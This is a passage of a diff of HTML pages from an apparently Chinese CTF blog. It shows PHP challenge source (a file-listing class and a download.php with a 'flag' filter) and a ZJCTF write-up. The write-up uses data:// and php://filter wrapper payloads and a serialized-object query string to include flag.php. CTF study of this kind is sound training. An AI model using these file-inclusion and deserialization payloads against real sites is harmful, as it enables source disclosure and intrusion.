+</span><span id="__span-66-30"><a id="__codelineno-66-30" name="__codelineno-66-30" href="#__codelineno-66-30"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-66-31"><a id="__codelineno-66-31" name="__codelineno-66-31" href="#__codelineno-66-31"></a>        <span class="nb">array_push</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span><span class="p">,</span> <span class="nv">$func</span><span class="p">);</span>
+</span><span id="__span-66-32"><a id="__codelineno-66-32" name="__codelineno-66-32" href="#__codelineno-66-32"></a>        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-66-33"><a id="__codelineno-66-33" name="__codelineno-66-33" href="#__codelineno-66-33"></a>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span><span class="p">[</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">()][</span><span class="nv">$func</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">();</span>
+</span><span id="__span-66-34"><a id="__codelineno-66-34" name="__codelineno-66-34" href="#__codelineno-66-34"></a>        <span class="p">}</span>
+</span><span id="__span-66-35"><a id="__codelineno-66-35" name="__codelineno-66-35" href="#__codelineno-66-35"></a>    <span class="p">}</span>
+</span><span id="__span-66-36"><a id="__codelineno-66-36" name="__codelineno-66-36" href="#__codelineno-66-36"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-66-37"><a id="__codelineno-66-37" name="__codelineno-66-37" href="#__codelineno-66-37"></a>        <span class="c1">// 输出 results</span>
+</span><span id="__span-66-38"><a id="__codelineno-66-38" name="__codelineno-66-38" href="#__codelineno-66-38"></a>    <span class="p">}</span>
+</span><span id="__span-66-39"><a id="__codelineno-66-39" name="__codelineno-66-39" href="#__codelineno-66-39"></a><span class="p">}</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>download.php（按截图整理）</summary>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="nb">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'sandbox'</span><span class="p">]);</span>
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
+</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="nv">$filename</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
+</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a><span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">40</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">stristr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">"flag"</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a>    <span class="nx">Header</span><span class="p">(</span><span class="s2">"Content-type: application/octet-stream"</span><span class="p">);</span>
+</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a>    <span class="nx">Header</span><span class="p">(</span><span class="s2">"Content-Disposition: attachment; filename="</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
+</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a>    <span class="k">echo</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-67-10"><a id="__codelineno-67-10" name="__codelineno-67-10" href="#__codelineno-67-10"></a>    <span class="k">echo</span> <span class="s2">"File not exist"</span><span class="p">;</span>
+</span><span id="__span-67-11"><a id="__codelineno-67-11" name="__codelineno-67-11" href="#__codelineno-67-11"></a><span class="p">}</span>
+</span><span id="__span-67-12"><a id="__codelineno-67-12" name="__codelineno-67-12" href="#__codelineno-67-12"></a><span class="cp">?&gt;</span>
+</span></code></pre></div>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-10-29 00:00:00+00:00">2026-10-29</time></li>
         
           <li class="md-meta__item">
@@ -4004,14 +4318,14 @@
 <p><img alt="index.php 源码" src="../../../assets/images/zjctf/01-index.png" /></p>
 <h3 id="text"><a class="toclink" href="../../zjctf-nizhuansiwei/#text">一、text</a></h3>
 <p>因为 <code>file_get_contents</code> 读的是文件，所以用 <code>data</code> 协议，构造 payload：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>?text=data://text/plain,welcome to the zjctf
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>?text=data://text/plain,welcome to the zjctf
 </span></code></pre></div>
 <p>成功。</p>
 <p><img alt="welcome to the zjctf" src="../../../assets/images/zjctf/02-welcome.png" /></p>
 <h3 id="file"><a class="toclink" href="../../zjctf-nizhuansiwei/#file">二、file</a></h3>
 <p>不能包含 <code>flag.php</code>，这个很可能就是 flag。他注释在旁边有一个 <code>useless.php</code>，先读一下文件。</p>
 <p>但是 <code>include</code> 会将其中的 PHP 代码直接执行而不会打印出来（里面没 echo 的情况下，一般都没有），所以这里利用 PHP 伪协议直接将其转换为 base64 的数据，就不会被执行了：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>php://filter/read=convert.base64-encode/resource=useless.php
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>php://filter/read=convert.base64-encode/resource=useless.php
 </span></code></pre></div>
 <p>对其进行解码后，接着审计代码。</p>
 <p><img alt="useless.php 源码" src="../../../assets/images/zjctf/03-useless.png" /></p>
@@ -4021,7 +4335,7 @@
 <p>依据那个类的形式进行序列化后，就可以得到 <code>password</code> 的值了。</p>
 <p><img alt="本地生成序列化" src="../../../assets/images/zjctf/04-serialize.png" /></p>
 <h3 id="payload"><a class="toclink" href="../../zjctf-nizhuansiwei/#payload">四、最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
 </span></code></pre></div>
 <p><img alt="拿到 flag" src="../../../assets/images/zjctf/05-flag.png" /></p>
 <h3 id="_1"><a class="toclink" href="../../zjctf-nizhuansiwei/#_1">踩的坑</a></h3>
